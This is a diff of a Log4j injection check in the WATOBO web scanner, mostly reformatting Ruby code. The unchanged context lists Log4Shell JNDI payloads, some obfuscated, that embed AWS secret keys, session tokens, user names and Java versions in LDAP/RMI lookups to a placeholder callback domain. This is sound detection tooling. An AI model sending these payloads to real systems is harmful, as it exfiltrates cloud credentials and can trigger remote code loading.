@@ -30,19 +30,19 @@ EOF
           measure = "All user input should be filtered and/or escaped using a method appropriate for the output context"
 
           @info.update(
-              :check_name => 'Log4j', # name of check which briefly describes functionality, will be used for tree and progress views
-              :check_group => AC_GROUP_JAVA,
-              :description => "Check for every parameter if log4j is triggered.", # description of checkfunction
-              :author => "Andreas Schmidt", # author of check
-              :version => "1.0" # check version
+            :check_name => 'Log4j', # name of check which briefly describes functionality, will be used for tree and progress views
+            :check_group => AC_GROUP_JAVA,
+            :description => "Check for every parameter if log4j is triggered.", # description of checkfunction
+            :author => "Andreas Schmidt", # author of check
+            :version => "1.0" # check version
           )
 
           @finding.update(
-              :threat => threat, # thread of vulnerability, e.g. loss of information
-              :class => "Log4j Injection", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
-              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
-              :rating => VULN_RATING_HIGH,
-              :measure => measure
+            :threat => threat, # thread of vulnerability, e.g. loss of information
+            :class => "Log4j Injection", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
+            :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
+            :rating => VULN_RATING_HIGH,
+            :measure => measure
           )
 
           def initialize(project, prefs = {})
@@ -54,7 +54,7 @@ EOF
             # ${${::-j}ndi:rmi://CALLBACK_DOMAIN/PAYLOAD}
             # NOT WORKING EXAMPLES
             # ${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://CALLBACK_TOKEN.CALLBACK_DOMAIN/PAYLOAD}
-            collection=<<'EOS'
+            collection = <<'EOS'
 ${jndi:ldap://${lower:CALLBACK_TOKEN}.aws.${env:AWS_SESSION_TOKEN:-notoken}.${env:AWS_ACCESS_KEY_ID:-nokey}.${env:AWS_SECRET_ACCESS_KEY:-nosecret}.exploit.CALLBACK_DOMAIN/PAYLOAD}
 ${jndi:ldap://${lower:CALLBACK_TOKEN}.user.name.${sys:user.name}.exploit.CALLBACK_DOMAIN/PAYLOAD}
 ${jndi:ldap://${lower:CALLBACK_TOKEN}.java.version.${sys:java.version}.exploit.CALLBACK_DOMAIN/PAYLOAD}
@@ -74,15 +74,14 @@ EOS
             @injections = collection.split
           end
 
-
           def generateChecks(chat)
             #
             #  Check GET-Parameters
             #
             begin
               checkparams = chat.request.parameters
-              header_params = Watobo::Resources::HTTP_HEADERS.select{|h| checkparams.select{|cp| cp.name == h}.empty? }
-              checkparams.concat header_params.map{|hh| Watobo::HeaderParameter.new( name: hh, value:'')}
+              header_params = Watobo::Resources::HTTP_HEADERS.select { |h| checkparams.select { |cp| cp.name == h }.empty? }
+              checkparams.concat header_params.map { |hh| Watobo::HeaderParameter.new(name: hh, value: '') }
               checkparams.each do |testparm|
 
                 # puts parm
@@ -94,10 +93,10 @@ EOS
                     test = chat.copyRequest
 
                     cbtkn = 'log4j' + SecureRandom.hex(3)
-                    cbsrv = Watobo::Conf::Scanner.dns_sensor
+                    cbsrv = Watobo::Conf::Scanner.dns_sensor || ''
 
                     value = check.gsub(/CALLBACK_DOMAIN/, cbsrv)
-                    value.gsub!(/CALLBACK_TOKEN/,cbtkn)
+                    value.gsub!(/CALLBACK_TOKEN/, cbtkn)
 
                     if testparm.location.to_s =~ /(url|http_parm|body|cookie)/
                       parm.value = CGI::escape(value)
@@ -108,11 +107,11 @@ EOS
                     # TODO: implement side-channel token check
                     #  e.g. globel "register" (token) and "check"
                     #   - limited lifetime
-                    # 
+                    #
                     test.set parm
-                    print '->'
+
                     test_request, test_response = doRequest(test)
-                    print '*'
+
                     [test_request, test_response]
                   }
                   yield checker
